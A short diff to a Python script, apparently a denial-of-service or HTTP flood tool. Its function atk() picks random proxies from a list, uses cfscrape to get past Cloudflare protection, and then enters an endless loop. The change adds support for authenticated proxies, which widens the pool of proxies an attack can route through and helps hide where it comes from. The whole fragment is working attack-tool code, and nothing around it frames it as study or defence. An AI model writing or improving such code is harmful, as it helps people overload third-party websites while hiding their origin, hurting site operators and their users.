@@ -60,8 +60,12 @@ def atk():
 	proxy = random.choice(pprr).strip().split(":")
 	s = cfscrape.create_scraper()
 	s.proxies = {}
-	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
-	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
+	if (len(proxy)==4):
+		s.proxies['http'] = 'http://'+str(proxy[2])+":"+str(proxy[3])+"@"+str(proxy[0])+":"+str(proxy[1])
+		s.proxies['https'] = 'https://'+str(proxy[2])+":"+str(proxy[3])+"@"+str(proxy[0])+":"+str(proxy[1])
+	else:
+		s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
+		s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
 	time.sleep(5)
 	while True:
 		while oo:
